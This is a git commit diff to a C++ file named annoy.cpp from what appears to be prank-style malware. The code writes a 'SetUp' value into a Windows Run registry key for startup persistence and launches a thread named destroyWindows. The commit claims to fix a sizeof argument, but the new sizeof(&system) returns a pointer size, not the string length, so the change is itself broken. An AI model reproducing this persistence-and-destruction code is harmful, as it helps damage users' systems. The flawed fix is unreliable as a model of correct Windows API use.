838bff2f8d97f00ed34af700e22659bfef21a5d8
vellur <veller950@gmail.com>
2018-06-30 19:22:45 +0200

    Fixed sizeof argument in registry setting value

--- src/annoy.cpp
+++ src/annoy.cpp
@@ -27,7 +27,7 @@ int main()
 
     HKEY hKey;
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
-    RegSetValueEx(hKey, "SetUp", 0, REG_SZ,(const unsigned char*)system, sizeof(system));
+    RegSetValueEx(hKey, "SetUp", 0, REG_SZ,(const unsigned char*)system, sizeof(&system));
     RegCloseKey(hKey);
 
     CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&destroyWindows, 0, 0, NULL);
